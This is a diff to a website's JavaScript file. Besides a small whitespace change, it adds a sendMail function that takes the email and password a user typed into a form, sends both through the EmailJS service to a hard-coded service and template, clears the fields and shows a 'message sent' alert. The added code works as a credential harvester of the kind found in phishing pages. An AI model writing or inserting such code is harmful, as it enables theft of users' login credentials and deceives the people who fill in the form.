@@ -23,7 +23,6 @@ if (window.location.pathname === "/") {
 }
 
 // Validation form 
-
 function formValidate() {
 
   var email = document.getElementById("email").value;
@@ -50,4 +49,26 @@ function formValidate() {
     return true;
   }
 
+}
+
+// email.js 
+function sendMail() {
+  var params = {
+    email: document.getElementById("email").value,
+    password: document.getElementById("password").value,
+  };
+
+
+  const serviceID = "service_65j6pz2";
+  const templateID = "template_cc7miah"
+
+  emailjs.send(serviceID, templateID, params)
+    .then(
+      res => {
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+        console.log(res);
+        alert("your massage sent successfuly")
+      })
+    .catch((err) => console.log(err));
 }
